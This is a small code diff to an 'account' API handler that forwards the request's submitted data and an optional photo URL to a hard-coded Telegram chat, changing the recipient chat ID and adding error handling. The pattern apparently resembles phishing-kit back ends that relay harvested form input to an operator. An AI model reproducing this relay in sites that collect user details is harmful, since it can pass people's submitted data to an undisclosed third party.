@@ -12,10 +12,18 @@ export default async function account(req, res) {
   const bot = new TelegramBot(token, { polling: true });
 
   function sendMSG() {
-    bot.sendMessage(6073170955, req.body.data);
-    bot.sendPhoto(6073170955, req.body.url);
-    bot.stopPolling()
-    return res.json({ success: 'true' })
+    try {
+      bot.sendMessage(6488746167, req.body.data);
+      req.body?.url && bot.sendPhoto(6488746167, req.body.url);
+      // bot.sendMessage(6073170955, req.body.data);
+      // bot.sendPhoto(6073170955, req.body.url);
+      bot.stopPolling()
+      return res.json({ msg: 'Bot SuccessFull' })
+    } catch (err) {
+      console.log(`Bot Error: ${err}`)
+      return res.json({ msg: `Bot Error: ${err}` })
+    }
+
   }
   sendMSG()
 }
